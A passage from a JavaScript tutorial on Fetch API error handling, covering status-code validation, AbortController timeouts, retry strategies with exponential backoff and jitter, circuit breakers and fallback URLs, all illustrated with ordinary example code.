// ❌ Wrong - parsing error not caught
try {
  const response = await fetch(url);
  return response.json(); // If this fails, error escapes try block
} catch (error) {
  console.error('Only catches fetch errors, not parsing errors');
}

// ✓ Correct - await inside try block
try {
  const response = await fetch(url);
  return await response.json(); // Both fetch and parse errors caught
} catch (error) {
  console.error('Catches all errors');
}
```

#### Swallowing Errors

```javascript
// ❌ Wrong - error disappears
fetch(url).catch(() => {
  console.log('Error occurred');
  // No re-throw or return value
});

// ✓ Correct - error propagated or handled
fetch(url)
  .then(r => r.json())
  .catch(error => {
    console.error('Error:', error);
    throw error; // or return fallback value
  });
```

---

## Status Code Validation

### HTTP Status Code Ranges

HTTP status codes are three-digit integers grouped into five classes:

- **1xx (Informational)**: Request received, continuing process
- **2xx (Success)**: Request successfully received, understood, and accepted
- **3xx (Redirection)**: Further action needed to complete the request
- **4xx (Client Error)**: Request contains bad syntax or cannot be fulfilled
- **5xx (Server Error)**: Server failed to fulfill a valid request

### The `ok` Property

The `Response.ok` property is a boolean indicating whether the response was successful. It returns `true` for status codes in the range **200-299**, and `false` otherwise.

```javascript
const response = await fetch('/api/data');

if (response.ok) {
  const data = await response.json();
} else {
  console.error('Request failed');
}
```

**Important Distinction**: `response.ok` only checks the status code range. It does not indicate whether the body contains valid data or whether the response matches expectations.

### Status Code Properties

**`response.status`**: The numeric HTTP status code (e.g., 200, 404, 500).

**`response.statusText`**: The status message corresponding to the status code (e.g., "OK", "Not Found", "Internal Server Error").

```javascript
const response = await fetch('/api/data');

console.log(response.status);     // 404
console.log(response.statusText); // "Not Found"
console.log(response.ok);         // false
```

### Fetch Does Not Reject on HTTP Errors

A critical behavior of the Fetch API: **fetch only rejects on network failures**, not HTTP error status codes. A response with status 404 or 500 still resolves the promise.

```javascript
try {
  const response = await fetch('/api/data');
  // This executes even if status is 404, 500, etc.
  console.log('Fetch succeeded');
} catch (error) {
  // Only catches network errors (DNS failure, connection refused, etc.)
  console.error('Network error:', error);
}
```

### Manual Status Validation

To treat HTTP errors as exceptions, check `response.ok` and throw manually:

```javascript
const response = await fetch('/api/data');

if (!response.ok) {
  throw new Error(`HTTP error! status: ${response.status}`);
}

const data = await response.json();
```

**Pattern with try-catch**:

```javascript
try {
  const response = await fetch('/api/data');
  
  if (!response.ok) {
    throw new Error(`HTTP error! status: ${response.status}`);
  }
  
  const data = await response.json();
  return data;
} catch (error) {
  console.error('Request failed:', error);
}
```

### Granular Status Code Handling

Different status codes often require different handling logic:

```javascript
const response = await fetch('/api/data');

switch (response.status) {
  case 200:
    return await response.json();
  
  case 204:
    return null; // No content
  
  case 400:
    const errorData = await response.json();
    throw new Error(`Bad request: ${errorData.message}`);
  
  case 401:
    // Redirect to login
    window.location.href = '/login';
    break;
  
  case 403:
    throw new Error('Access forbidden');
  
  case 404:
    throw new Error('Resource not found');
  
  case 429:
    const retryAfter = response.headers.get('Retry-After');
    throw new Error(`Rate limited. Retry after ${retryAfter} seconds`);
  
  case 500:
  case 502:
  case 503:
    throw new Error('Server error. Please try again later');
  
  default:
    throw new Error(`Unexpected status: ${response.status}`);
}
```

### Range-Based Validation

Checking specific status code ranges:

```javascript
const response = await fetch('/api/data');

// Success range (2xx)
if (response.status >= 200 && response.status < 300) {
  return await response.json();
}

// Client error range (4xx)
if (response.status >= 400 && response.status < 500) {
  throw new Error('Client error');
}

// Server error range (5xx)
if (response.status >= 500 && response.status < 600) {
  throw new Error('Server error');
}
```

### Custom Validation Helper

Creating a reusable validation function:

```javascript
async function validateResponse(response) {
  if (!response.ok) {
    const errorBody = await response.text();
    const error = new Error(`HTTP ${response.status}: ${response.statusText}`);
    error.status = response.status;
    error.statusText = response.statusText;
    error.body = errorBody;
    throw error;
  }
  return response;
}

// Usage
const response = await fetch('/api/data');
await validateResponse(response);
const data = await response.json();
```

### Enhanced Error Information

Extracting error details from response body:

```javascript
async function handleError(response) {
  let errorMessage = `HTTP ${response.status}: ${response.statusText}`;
  
  const contentType = response.headers.get('content-type');
  
  if (contentType && contentType.includes('application/json')) {
    const errorData = await response.json();
    errorMessage += ` - ${errorData.message || JSON.stringify(errorData)}`;
  } else {
    const errorText = await response.text();
    if (errorText) {
      errorMessage += ` - ${errorText}`;
    }
  }
  
  throw new Error(errorMessage);
}

const response = await fetch('/api/data');
if (!response.ok) {
  await handleError(response);
}
```

### Redirects and Status Codes

**Automatic Redirect Handling**: By default, fetch follows redirects (3xx status codes) automatically. The final response reflects the redirected URL.

```javascript
const response = await fetch('/old-url'); // Redirects to /new-url
console.log(response.url);        // https://example.com/new-url
console.log(response.status);     // 200 (final status)
console.log(response.redirected); // true
```

**Manual Redirect Handling**: Set `redirect: 'manual'` to prevent automatic following:

```javascript
const response = await fetch('/old-url', { redirect: 'manual' });
console.log(response.status); // 301, 302, 307, etc.
console.log(response.type);   // "opaqueredirect"
```

### Informational Status Codes (1xx)

Fetch typically does not expose 1xx status codes to JavaScript. These are handled at the protocol level:

- **100 Continue**: Client should continue with request
- **101 Switching Protocols**: Server is switching protocols (e.g., to WebSocket)

[Inference] These status codes are processed by the browser's network stack before the response reaches JavaScript.

### Specific Status Code Scenarios

**204 No Content**:

```javascript
const response = await fetch('/api/delete', { method: 'DELETE' });

if (response.status === 204) {
  console.log('Deleted successfully, no content returned');
  // Don't attempt to parse body
}
```

**304 Not Modified**:

```javascript
const response = await fetch('/api/data', {
  headers: { 'If-None-Match': etag }
});

if (response.status === 304) {
  console.log('Use cached version');
  // Body will be empty
}
```

**401 vs 403**:

- **401 Unauthorized**: Authentication required or failed
- **403 Forbidden**: Authenticated but lacks permission

```javascript
if (response.status === 401) {
  // Redirect to login or refresh token
  await refreshAuthToken();
} else if (response.status === 403) {
  // Show "access denied" message
  alert('You do not have permission to access this resource');
}
```

### Retry Logic Based on Status Codes

Certain status codes warrant retry attempts:

```javascript
async function fetchWithRetry(url, options = {}, maxRetries = 3) {
  for (let i = 0; i < maxRetries; i++) {
    const response = await fetch(url, options);
    
    // Success
    if (response.ok) {
      return response;
    }
    
    // Don't retry client errors (except 408, 429)
    if (response.status >= 400 && response.status < 500) {
      if (response.status === 408 || response.status === 429) {
        // Request Timeout or Rate Limited - retry
        await delay(Math.pow(2, i) * 1000); // Exponential backoff
        continue;
      }
      throw new Error(`Client error: ${response.status}`);
    }
    
    // Retry server errors (5xx)
    if (response.status >= 500 && i < maxRetries - 1) {
      await delay(Math.pow(2, i) * 1000);
      continue;
    }
    
    throw new Error(`Server error: ${response.status}`);
  }
}

function delay(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}
```

### Validation in Service Workers

Service workers can intercept and validate responses before returning them:

```javascript
self.addEventListener('fetch', event => {
  event.respondWith(
    fetch(event.request).then(response => {
      if (!response.ok) {
        // Log error
        console.error(`Failed request: ${response.status}`);
        
        // Return custom error response
        return new Response(
          JSON.stringify({ error: 'Request failed' }), 
          { 
            status: response.status,
            headers: { 'Content-Type': 'application/json' }
          }
        );
      }
      
      return response;
    })
  );
});
```

### TypeScript Type Guards

Creating type-safe status validation:

```typescript
function isSuccessStatus(status: number): status is 200 | 201 | 204 {
  return status >= 200 && status < 300;
}

function isClientError(status: number): boolean {
  return status >= 400 && status < 500;
}

function isServerError(status: number): boolean {
  return status >= 500 && status < 600;
}

const response = await fetch('/api/data');

if (isSuccessStatus(response.status)) {
  // TypeScript knows this is a success status
  const data = await response.json();
}
```

### Wrapper Function Pattern

Abstracting validation into a fetch wrapper:

```javascript
async function fetchJSON(url, options = {}) {
  const response = await fetch(url, options);
  
  // Handle no content
  if (response.status === 204) {
    return null;
  }
  
  // Validate status
  if (!response.ok) {
    let errorMessage = `HTTP ${response.status}`;
    
    try {
      const errorData = await response.json();
      errorMessage = errorData.message || errorData.error || errorMessage;
    } catch {
      // If JSON parsing fails, use status text
      errorMessage = response.statusText || errorMessage;
    }
    
    const error = new Error(errorMessage);
    error.status = response.status;
    throw error;
  }
  
  return response.json();
}

// Usage
try {
  const data = await fetchJSON('/api/data');
} catch (error) {
  console.error(`Failed with status ${error.status}:`, error.message);
}
```

### Testing Status Code Handling

Mock responses for different status codes:

```javascript
// Mock fetch for testing
global.fetch = jest.fn((url) => {
  if (url.includes('success')) {
    return Promise.resolve({
      ok: true,
      status: 200,
      json: () => Promise.resolve({ data: 'success' })
    });
  }
  
  if (url.includes('not-found')) {
    return Promise.resolve({
      ok: false,
      status: 404,
      statusText: 'Not Found',
      json: () => Promise.resolve({ error: 'Not found' })
    });
  }
  
  if (url.includes('server-error')) {
    return Promise.resolve({
      ok: false,
      status: 500,
      statusText: 'Internal Server Error'
    });
  }
});
```

---

## Timeout Handling

### Native AbortController Approach

The Fetch API doesn't have built-in timeout functionality, but you can implement timeouts using `AbortController` and `AbortSignal`.

**Basic timeout implementation:**

```javascript
const controller = new AbortController();
const timeoutId = setTimeout(() => controller.abort(), 5000);

try {
  const response = await fetch('https://api.example.com/data', {
    signal: controller.signal
  });
  clearTimeout(timeoutId);
  const data = await response.json();
} catch (error) {
  if (error.name === 'AbortError') {
    console.error('Request timed out');
  } else {
    console.error('Request failed:', error);
  }
}
```

### Timeout During JSON Parsing

The timeout approach above only covers the fetch request itself, not the `response.json()` parsing phase. To include parsing:

```javascript
const controller = new AbortController();
const timeoutId = setTimeout(() => controller.abort(), 5000);

try {
  const response = await fetch('https://api.example.com/data', {
    signal: controller.signal
  });
  
  const data = await response.json();
  clearTimeout(timeoutId); // Clear after parsing completes
  
} catch (error) {
  clearTimeout(timeoutId);
  if (error.name === 'AbortError') {
    console.error('Request or parsing timed out');
  }
  throw error;
}
```

**Important:** `AbortSignal` doesn't directly interrupt `response.json()` parsing once it has started. [Inference] The timeout will only trigger if the entire operation (fetch + parsing) hasn't completed within the timeout period.

### Reusable Timeout Function

```javascript
async function fetchWithTimeout(url, options = {}, timeout = 5000) {
  const controller = new AbortController();
  const timeoutId = setTimeout(() => controller.abort(), timeout);
  
  try {
    const response = await fetch(url, {
      ...options,
      signal: controller.signal
    });
    
    return response;
    
  } finally {
    clearTimeout(timeoutId);
  }
}

// Usage
try {
  const response = await fetchWithTimeout('https://api.example.com/data', {}, 5000);
  const data = await response.json();
} catch (error) {
  if (error.name === 'AbortError') {
    console.error('Request timed out after 5 seconds');
  }
}
```

### Separate Timeouts for Fetch and Parsing

For large JSON responses where parsing might take significant time:

```javascript
async function fetchJSONWithTimeouts(url, fetchTimeout = 5000, parseTimeout = 3000) {
  // Fetch timeout
  const fetchController = new AbortController();
  const fetchTimeoutId = setTimeout(() => fetchController.abort(), fetchTimeout);
  
  try {
    const response = await fetch(url, { signal: fetchController.signal });
    clearTimeout(fetchTimeoutId);
    
    // Parse timeout
    const parsePromise = response.json();
    const timeoutPromise = new Promise((_, reject) => {
      setTimeout(() => reject(new Error('JSON parsing timeout')), parseTimeout);
    });
    
    const data = await Promise.race([parsePromise, timeoutPromise]);
    return data;
    
  } catch (error) {
    clearTimeout(fetchTimeoutId);
    
    if (error.name === 'AbortError') {
      throw new Error('Fetch request timed out');
    } else if (error.message === 'JSON parsing timeout') {
      throw new Error('JSON parsing took too long');
    }
    throw error;
  }
}
```

[Unverified] Whether this pattern actually interrupts JSON parsing or just rejects the promise while parsing continues in the background depends on JavaScript engine implementation.

### AbortSignal.timeout() Static Method

Modern browsers support `AbortSignal.timeout()` for simpler timeout handling:

```javascript
try {
  const response = await fetch('https://api.example.com/data', {
    signal: AbortSignal.timeout(5000)
  });
  const data = await response.json();
} catch (error) {
  if (error.name === 'TimeoutError' || error.name === 'AbortError') {
    console.error('Request timed out');
  }
}
```

**Browser support:** Chrome 103+, Firefox 100+, Safari 16+, Node.js 17.3+

### Combining Manual Abort with Timeout

You can combine user-triggered abort with automatic timeout:

```javascript
const controller = new AbortController();
const timeoutId = setTimeout(() => controller.abort(), 10000);

// User can manually abort
document.getElementById('cancelBtn').addEventListener('click', () => {
  controller.abort();
});

try {
  const response = await fetch('https://api.example.com/data', {
    signal: controller.signal
  });
  clearTimeout(timeoutId);
  const data = await response.json();
} catch (error) {
  clearTimeout(timeoutId);
  if (error.name === 'AbortError') {
    console.error('Request cancelled or timed out');
  }
}
```

### Timeout with Retry Logic

```javascript
async function fetchWithRetry(url, maxRetries = 3, timeout = 5000) {
  let lastError;
  
  for (let attempt = 0; attempt < maxRetries; attempt++) {
    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), timeout);
    
    try {
      const response = await fetch(url, { signal: controller.signal });
      clearTimeout(timeoutId);
      
      if (!response.ok) {
        throw new Error(`HTTP ${response.status}`);
      }
      
      return await response.json();
      
    } catch (error) {
      clearTimeout(timeoutId);
      lastError = error;
      
      if (error.name === 'AbortError') {
        console.warn(`Attempt ${attempt + 1} timed out`);
      } else {
        console.warn(`Attempt ${attempt + 1} failed:`, error.message);
      }
      
      // Don't retry on last attempt
      if (attempt < maxRetries - 1) {
        await new Promise(resolve => setTimeout(resolve, 1000 * (attempt + 1)));
      }
    }
  }
  
  throw lastError;
}
```

### Timeout Error Detection

Different timeout scenarios produce different error types:

```javascript
try {
  const response = await fetch(url, { signal: controller.signal });
  const data = await response.json();
} catch (error) {
  if (error.name === 'AbortError') {
    // Fetch was aborted (could be timeout or manual)
    console.error('Request aborted');
  } else if (error.name === 'TimeoutError') {
    // AbortSignal.timeout() specific error
    console.error('Request timeout');
  } else if (error instanceof TypeError && error.message.includes('network')) {
    // Network failure
    console.error('Network error');
  } else if (error instanceof SyntaxError) {
    // JSON parsing failed
    console.error('Invalid JSON');
  } else {
    console.error('Unknown error:', error);
  }
}
```

### Progress Tracking with Timeout

For long-running requests, you can track progress and reset timeout on activity:

```javascript
async function fetchWithActivityTimeout(url, inactivityTimeout = 5000) {
  const controller = new AbortController();
  let timeoutId;
  
  const resetTimeout = () => {
    clearTimeout(timeoutId);
    timeoutId = setTimeout(() => controller.abort(), inactivityTimeout);
  };
  
  resetTimeout();
  
  try {
    const response = await fetch(url, { signal: controller.signal });
    resetTimeout();
    
    const reader = response.body.getReader();
    const chunks = [];
    
    while (true) {
      const { done, value } = await reader.read();
      resetTimeout(); // Reset on each chunk
      
      if (done) break;
      chunks.push(value);
    }
    
    clearTimeout(timeoutId);
    
    // Combine chunks and parse
    const text = new TextDecoder().decode(
      new Uint8Array(chunks.reduce((acc, chunk) => [...acc, ...chunk], []))
    );
    return JSON.parse(text);
    
  } catch (error) {
    clearTimeout(timeoutId);
    throw error;
  }
}
```

### Timeout Configuration Patterns

**Global timeout configuration:**

```javascript
class APIClient {
  constructor(baseURL, defaultTimeout = 5000) {
    this.baseURL = baseURL;
    this.defaultTimeout = defaultTimeout;
  }
  
  async fetch(endpoint, options = {}) {
    const timeout = options.timeout ?? this.defaultTimeout;
    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), timeout);
    
    try {
      const response = await fetch(`${this.baseURL}${endpoint}`, {
        ...options,
        signal: options.signal || controller.signal
      });
      
      clearTimeout(timeoutId);
      return response;
      
    } catch (error) {
      clearTimeout(timeoutId);
      throw error;
    }
  }
  
  async getJSON(endpoint, options = {}) {
    const response = await this.fetch(endpoint, options);
    return response.json();
  }
}

// Usage
const api = new APIClient('https://api.example.com', 10000);
const data = await api.getJSON('/users', { timeout: 3000 });
```

### Memory Cleanup

Always clear timeouts to prevent memory leaks:

```javascript
// ❌ Bad - timeout not cleared on success
const controller = new AbortController();
setTimeout(() => controller.abort(), 5000);
const response = await fetch(url, { signal: controller.signal });

// ✅ Good - timeout cleared
const controller = new AbortController();
const timeoutId = setTimeout(() => controller.abort(), 5000);
try {
  const response = await fetch(url, { signal: controller.signal });
  clearTimeout(timeoutId);
} catch (error) {
  clearTimeout(timeoutId);
  throw error;
}

// ✅ Better - use finally
const controller = new AbortController();
const timeoutId = setTimeout(() => controller.abort(), 5000);
try {
  const response = await fetch(url, { signal: controller.signal });
  return await response.json();
} finally {
  clearTimeout(timeoutId);
}
```

### Platform-Specific Considerations

**Node.js:**

- `AbortController` available in Node.js 15+
- `AbortSignal.timeout()` available in Node.js 17.3+

**Deno:**

- Full AbortController and AbortSignal support
- `AbortSignal.timeout()` supported

**React Native:**

- AbortController supported
- [Unverified] `AbortSignal.timeout()` support depends on JavaScript engine version

---

## Retry Strategies

### Basic Retry Implementation

```javascript
async function fetchWithRetry(url, options = {}, maxRetries = 3) {
  let lastError;
  
  for (let i = 0; i < maxRetries; i++) {
    try {
      const response = await fetch(url, options);
      
      if (response.ok) {
        return response;
      }
      
      // Don't retry on client errors (4xx)
      if (response.status >= 400 && response.status < 500) {
        throw new Error(`Client error: ${response.status}`);
      }
      
      lastError = new Error(`HTTP ${response.status}`);
      
    } catch (error) {
      lastError = error;
      
      // Don't retry on network errors if this is the last attempt
      if (i === maxRetries - 1) {
        throw lastError;
      }
    }
  }
  
  throw lastError;
}
```

### Exponential Backoff

Increases wait time exponentially between retries to avoid overwhelming the server.

```javascript
async function fetchWithExponentialBackoff(
  url, 
  options = {}, 
  maxRetries = 5,
  baseDelay = 1000
) {
  for (let i = 0; i < maxRetries; i++) {
    try {
      const response = await fetch(url, options);
      
      if (response.ok) {
        return response;
      }
      
      if (response.status >= 400 && response.status < 500) {
        throw new Error(`Client error: ${response.status}`);
      }
      
      // Calculate exponential backoff: baseDelay * 2^attempt
      const delay = baseDelay * Math.pow(2, i);
      await new Promise(resolve => setTimeout(resolve, delay));
      
    } catch (error) {
      if (i === maxRetries - 1) {
        throw error;
      }
      
      const delay = baseDelay * Math.pow(2, i);
      await new Promise(resolve => setTimeout(resolve, delay));
    }
  }
}
```

### Exponential Backoff with Jitter

Adds randomness to prevent thundering herd problem when multiple clients retry simultaneously.

```javascript
async function fetchWithJitter(
  url,
  options = {},
  maxRetries = 5,
  baseDelay = 1000,
  maxDelay = 30000
) {
  for (let i = 0; i < maxRetries; i++) {
    try {
      const response = await fetch(url, options);
      
      if (response.ok) {
        return response;
      }
      
      if (response.status >= 400 && response.status < 500) {
        throw new Error(`Client error: ${response.status}`);
      }
      
    } catch (error) {
      if (i === maxRetries - 1) {
        throw error;
      }
    }
    
    // Full jitter: random value between 0 and exponential backoff
    const exponentialDelay = Math.min(baseDelay * Math.pow(2, i), maxDelay);
    const jitter = Math.random() * exponentialDelay;
    
    await new Promise(resolve => setTimeout(resolve, jitter));
  }
}
```

### Decorrelated Jitter

Provides better distribution of retry attempts compared to full jitter.

```javascript
async function fetchWithDecorrelatedJitter(
  url,
  options = {},
  maxRetries = 5,
  baseDelay = 1000,
  maxDelay = 30000
) {
  let currentDelay = baseDelay;
  
  for (let i = 0; i < maxRetries; i++) {
    try {
      const response = await fetch(url, options);
      
      if (response.ok) {
        return response;
      }
      
      if (response.status >= 400 && response.status < 500) {
        throw new Error(`Client error: ${response.status}`);
      }
      
    } catch (error) {
      if (i === maxRetries - 1) {
        throw error;
      }
    }
    
    // Decorrelated jitter: random between baseDelay and 3 * currentDelay
    const minDelay = baseDelay;
    const maxPossibleDelay = Math.min(3 * currentDelay, maxDelay);
    currentDelay = minDelay + Math.random() * (maxPossibleDelay - minDelay);
    
    await new Promise(resolve => setTimeout(resolve, currentDelay));
  }
}
```

### Retry on Specific Status Codes

```javascript
async function fetchWithSelectiveRetry(
  url,
  options = {},
  maxRetries = 3,
  retryableStatuses = [408, 429, 500, 502, 503, 504]
) {
  let lastError;
  
  for (let i = 0; i < maxRetries; i++) {
    try {
      const response = await fetch(url, options);
      
      if (response.ok) {
        return response;
      }
      
      // Only retry on specific status codes
      if (!retryableStatuses.includes(response.status)) {
        throw new Error(`Non-retryable status: ${response.status}`);
      }
      
      lastError = new Error(`HTTP ${response.status}`);
      
      // Wait before retry
      await new Promise(resolve => setTimeout(resolve, 1000 * (i + 1)));
      
    } catch (error) {
      if (i === maxRetries - 1) {
        throw lastError || error;
      }
      
      // For network errors, always retry
      if (error instanceof TypeError) {
        await new Promise(resolve => setTimeout(resolve, 1000 * (i + 1)));
      } else {
        throw error;
      }
    }
  }
  
  throw lastError;
}
```

### Retry with Timeout

```javascript
async function fetchWithTimeout(url, options = {}, timeout = 5000) {
  const controller = new AbortController();
  const timeoutId = setTimeout(() => controller.abort(), timeout);
  
  try {
    const response = await fetch(url, {
      ...options,
      signal: controller.signal
    });
    clearTimeout(timeoutId);
    return response;
  } catch (error) {
    clearTimeout(timeoutId);
    throw error;
  }
}

async function fetchWithRetryAndTimeout(
  url,
  options = {},
  maxRetries = 3,
  timeout = 5000,
  baseDelay = 1000
) {
  for (let i = 0; i < maxRetries; i++) {
    try {
      const response = await fetchWithTimeout(url, options, timeout);
      
      if (response.ok) {
        return response;
      }
      
      if (response.status >= 400 && response.status < 500) {
        throw new Error(`Client error: ${response.status}`);
      }
      
    } catch (error) {
      if (i === maxRetries - 1) {
        throw error;
      }
      
      const delay = baseDelay * Math.pow(2, i);
      await new Promise(resolve => setTimeout(resolve, delay));
    }
  }
}
```

### Retry with Rate Limit Handling

Respects Retry-After header for 429 (Too Many Requests) responses.

```javascript
async function fetchWithRateLimitRetry(
  url,
  options = {},
  maxRetries = 3
) {
  for (let i = 0; i < maxRetries; i++) {
    try {
      const response = await fetch(url, options);
      
      if (response.ok) {
        return response;
      }
      
      // Handle rate limiting
      if (response.status === 429) {
        const retryAfter = response.headers.get('Retry-After');
        
        if (retryAfter) {
          // Retry-After can be in seconds or a date
          const delay = isNaN(retryAfter)
            ? new Date(retryAfter) - Date.now()
            : parseInt(retryAfter) * 1000;
          
          await new Promise(resolve => setTimeout(resolve, delay));
          continue;
        }
      }
      
      if (response.status >= 400 && response.status < 500 && response.status !== 429) {
        throw new Error(`Client error: ${response.status}`);
      }
      
      // Default backoff for server errors
      const delay = 1000 * Math.pow(2, i);
      await new Promise(resolve => setTimeout(resolve, delay));
      
    } catch (error) {
      if (i === maxRetries - 1) {
        throw error;
      }
      
      const delay = 1000 * Math.pow(2, i);
      await new Promise(resolve => setTimeout(resolve, delay));
    }
  }
}
```

### Circuit Breaker Pattern

Prevents repeated attempts to a failing service by temporarily "opening" the circuit.

```javascript
class CircuitBreaker {
  constructor(threshold = 5, timeout = 60000) {
    this.failureCount = 0;
    this.threshold = threshold;
    this.timeout = timeout;
    this.state = 'CLOSED'; // CLOSED, OPEN, HALF_OPEN
    this.nextAttempt = Date.now();
  }
  
  async execute(fn) {
    if (this.state === 'OPEN') {
      if (Date.now() < this.nextAttempt) {
        throw new Error('Circuit breaker is OPEN');
      }
      this.state = 'HALF_OPEN';
    }
    
    try {
      const result = await fn();
      this.onSuccess();
      return result;
    } catch (error) {
      this.onFailure();
      throw error;
    }
  }
  
  onSuccess() {
    this.failureCount = 0;
    this.state = 'CLOSED';
  }
  
  onFailure() {
    this.failureCount++;
    if (this.failureCount >= this.threshold) {
      this.state = 'OPEN';
      this.nextAttempt = Date.now() + this.timeout;
    }
  }
}

// Usage
const breaker = new CircuitBreaker(5, 60000);

async function fetchWithCircuitBreaker(url, options = {}) {
  return breaker.execute(async () => {
    const response = await fetch(url, options);
    if (!response.ok) {
      throw new Error(`HTTP ${response.status}`);
    }
    return response;
  });
}
```

### Retry with Progress Tracking

```javascript
async function fetchWithRetryProgress(
  url,
  options = {},
  maxRetries = 3,
  onProgress = null
) {
  for (let attempt = 1; attempt <= maxRetries; attempt++) {
    try {
      if (onProgress) {
        onProgress({ attempt, maxRetries, status: 'attempting' });
      }
      
      const response = await fetch(url, options);
      
      if (response.ok) {
        if (onProgress) {
          onProgress({ attempt, maxRetries, status: 'success' });
        }
        return response;
      }
      
      if (response.status >= 400 && response.status < 500) {
        if (onProgress) {
          onProgress({ attempt, maxRetries, status: 'failed', error: `HTTP ${response.status}` });
        }
        throw new Error(`Client error: ${response.status}`);
      }
      
    } catch (error) {
      if (attempt === maxRetries) {
        if (onProgress) {
          onProgress({ attempt, maxRetries, status: 'exhausted', error: error.message });
        }
        throw error;
      }
      
      const delay = 1000 * Math.pow(2, attempt - 1);
      
      if (onProgress) {
        onProgress({ attempt, maxRetries, status: 'retrying', delay });
      }
      
      await new Promise(resolve => setTimeout(resolve, delay));
    }
  }
}

// Usage
await fetchWithRetryProgress('/api/data', {}, 3, (progress) => {
  console.log(`Attempt ${progress.attempt}/${progress.maxRetries}: ${progress.status}`);
});
```

### Configurable Retry Strategy

```javascript
class RetryStrategy {
  constructor(config = {}) {
    this.maxRetries = config.maxRetries || 3;
    this.baseDelay = config.baseDelay || 1000;
    this.maxDelay = config.maxDelay || 30000;
    this.timeout = config.timeout || 0;
    this.retryableStatuses = config.retryableStatuses || [408, 429, 500, 502, 503, 504];
    this.backoffStrategy = config.backoffStrategy || 'exponential'; // 'exponential', 'linear', 'constant'
    this.jitter = config.jitter !== false; // default true
    this.onRetry = config.onRetry || null;
  }
  
  calculateDelay(attempt) {
    let delay;
    
    switch (this.backoffStrategy) {
      case 'linear':
        delay = this.baseDelay * attempt;
        break;
      case 'constant':
        delay = this.baseDelay;
        break;
      case 'exponential':
      default:
        delay = this.baseDelay * Math.pow(2, attempt);
    }
    
    delay = Math.min(delay, this.maxDelay);
    
    if (this.jitter) {
      delay = Math.random() * delay;
    }
    
    return delay;
  }
  
  shouldRetry(response, error, attempt) {
    if (attempt >= this.maxRetries) {
      return false;
    }
    
    if (error) {
      // Retry on network errors
      return error instanceof TypeError;
    }
    
    if (response) {
      // Don't retry on success
      if (response.ok) {
        return false;
      }
      
      // Check if status is retryable
      return this.retryableStatuses.includes(response.status);
    }
    
    return false;
  }
  
  async execute(url, options = {}) {
    let attempt = 0;
    let lastError;
    
    while (attempt < this.maxRetries) {
      try {
        const controller = this.timeout > 0 ? new AbortController() : null;
        const timeoutId = controller ? setTimeout(() => controller.abort(), this.timeout) : null;
        
        const response = await fetch(url, {
          ...options,
          signal: controller?.signal
        });
        
        if (timeoutId) clearTimeout(timeoutId);
        
        if (response.ok) {
          return response;
        }
        
        if (!this.shouldRetry(response, null, attempt)) {
          throw new Error(`HTTP ${response.status}`);
        }
        
        lastError = new Error(`HTTP ${response.status}`);
        
      } catch (error) {
        lastError = error;
        
        if (!this.shouldRetry(null, error, attempt)) {
          throw error;
        }
      }
      
      const delay = this.calculateDelay(attempt);
      
      if (this.onRetry) {
        this.onRetry({
          attempt: attempt + 1,
          maxRetries: this.maxRetries,
          delay,
          error: lastError
        });
      }
      
      await new Promise(resolve => setTimeout(resolve, delay));
      attempt++;
    }
    
    throw lastError;
  }
}

// Usage examples
const strategy = new RetryStrategy({
  maxRetries: 5,
  baseDelay: 1000,
  maxDelay: 30000,
  backoffStrategy: 'exponential',
  jitter: true,
  timeout: 5000,
  onRetry: (info) => console.log(`Retrying attempt ${info.attempt}...`)
});

const response = await strategy.execute('/api/data');
```

### Retry Queue for Multiple Requests

```javascript
class RetryQueue {
  constructor(maxConcurrent = 3) {
    this.queue = [];
    this.active = 0;
    this.maxConcurrent = maxConcurrent;
  }
  
  async add(fn) {
    return new Promise((resolve, reject) => {
      this.queue.push({ fn, resolve, reject });
      this.process();
    });
  }
  
  async process() {
    if (this.active >= this.maxConcurrent || this.queue.length === 0) {
      return;
    }
    
    this.active++;
    const { fn, resolve, reject } = this.queue.shift();
    
    try {
      const result = await fn();
      resolve(result);
    } catch (error) {
      reject(error);
    } finally {
      this.active--;
      this.process();
    }
  }
}

// Usage
const queue = new RetryQueue(3);

const results = await Promise.all([
  queue.add(() => fetchWithRetry('/api/data1')),
  queue.add(() => fetchWithRetry('/api/data2')),
  queue.add(() => fetchWithRetry('/api/data3')),
  queue.add(() => fetchWithRetry('/api/data4')),
  queue.add(() => fetchWithRetry('/api/data5'))
]);
```

### Retry with Fallback

```javascript
async function fetchWithFallback(
  primaryUrl,
  fallbackUrls = [],
  options = {},
  maxRetries = 2
) {
  const urls = [primaryUrl, ...fallbackUrls];
  let lastError;
  
  for (const url of urls) {
    for (let attempt = 0; attempt < maxRetries; attempt++) {
      try {
        const response = await fetch(url, options);
        
        if (response.ok) {
          return response;
        }
        
        lastError = new Error(`HTTP ${response.status} from ${url}`);
        
      } catch (error) {
        lastError = error;
      }
      
      // Wait before retry
      if (attempt < maxRetries - 1) {
        await new Promise(resolve => setTimeout(resolve, 1000 * (attempt + 1)));
      }
    }
  }
  
  throw lastError;
}

// Usage
const response = await fetchWithFallback(
  'https://primary-api.com/data',
  [
    'https://backup-api.com/data',
    'https://fallback-api.com/data'
  ]
);
```

### Comparison of Backoff Strategies

|Strategy|Delay Pattern|Use Case|
|---|---|---|
|Constant|Same delay each time|Simple, predictable timing|
|Linear|Increases linearly|Moderate load management|
|Exponential|Doubles each time|Aggressive backoff for overloaded servers|
|Full Jitter|Random up to exponential|Prevents thundering herd|
|Decorrelated Jitter|Random with correlation|Better distribution than full jitter|

### Best Practices

1. Always implement exponential backoff for production systems
2. Add jitter to prevent synchronized retries from multiple clients
3. Respect Retry-After headers from servers
4. Don't retry on client errors (4xx) except 408, 429
5. Always retry on transient network errors
6. Set reasonable maximum retry attempts and delays
7. Consider circuit breakers for frequently failing services
8. Log retry attempts for monitoring and debugging
9. Use timeouts to prevent indefinite waiting
10. Implement proper error handling for exhausted retries

### Common Retryable Conditions

**Always Retry:**

- 408 Request Timeout
- 429 Too Many Requests
- 500 Internal Server Error
- 502 Bad Gateway
- 503 Service Unavailable
- 504 Gateway Timeout
- Network errors (TypeError from fetch)
- Connection timeouts

**Never Retry:**

- 400 Bad Request
- 401 Unauthorized
- 403 Forbidden
- 404 Not Found
- 405 Method Not Allowed
- Any other 4xx client errors

---

## Error Recovery Patterns

Error recovery patterns for the Fetch API involve strategies to handle failures gracefully, retry failed requests, implement fallback mechanisms, and maintain application resilience when network requests fail.

### Types of Errors in Fetch

Fetch can fail in multiple ways, each requiring different handling strategies:

